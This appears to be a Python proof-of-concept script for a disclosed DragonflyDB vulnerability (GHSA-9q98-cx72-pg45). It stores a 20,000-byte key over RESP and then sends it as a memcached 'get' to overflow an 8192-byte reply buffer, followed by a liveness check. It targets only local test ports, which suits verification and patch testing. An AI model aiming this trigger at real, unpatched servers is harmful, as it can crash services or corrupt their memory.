#!/usr/bin/env python3
"""Differential trigger for GHSA-9q98-cx72-pg45 (DragonflyDB memcached reply overflow).

Host-side client. All sockets go to 127.0.0.1 ports published by run.sh;
no external probe, no bulk/target-list mode.
"""
import socket
import sys

RESP_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 16379
MC_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 16211
KEY_LEN = int(sys.argv[3]) if len(sys.argv) > 3 else 20000

key = b"k" * KEY_LEN


def read_reply(sock, want_end=False):
    sock.settimeout(3)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if want_end and data.endswith(b"END\r\n"):
                break
            if not want_end and data:
                break
    except socket.timeout:
        data += b"<TIMEOUT>"
    return data


# 1. Stage the long key over RESP (no 250-byte limit on that path).
s = socket.create_connection(("127.0.0.1", RESP_PORT), timeout=3)
req = b"*3\r\n$3\r\nSET\r\n$" + str(len(key)).encode() + b"\r\n" + key + b"\r\n$5\r\nvalue\r\n"
s.sendall(req)
print("RESP SET reply:", repr(read_reply(s)))
s.close()

# 2. Raw memcached get of the same oversized key. The stock parser (pre-1.40.2)
#    lets it through and SendValue echoes it into an 8192-byte reply buffer.
m = socket.create_connection(("127.0.0.1", MC_PORT), timeout=3)
m.sendall(b"get " + key + b"\r\n")
resp = read_reply(m, want_end=True)
print("MC get reply length:", len(resp))
print("MC get reply head:", repr(resp[:160]))
print("MC get reply tail:", repr(resp[-80:]))
print("echoed full key:", key in resp)
print("has VALUE line:", b"VALUE " in resp)
m.close()

# 3. Liveness after the trigger: a live server answers a short get with END.
for name, port in (("resp", RESP_PORT), ("memcached", MC_PORT)):
    try:
        c = socket.create_connection(("127.0.0.1", port), timeout=2)
        if name == "resp":
            c.sendall(b"*1\r\n$4\r\nPING\r\n")
        else:
            c.sendall(b"get probe\r\n")
        print(name, "alive reply:", repr(c.recv(200)))
        c.close()
    except Exception as exc:
        print(name, "ALIVE CHECK FAILED:", type(exc).__name__, exc)
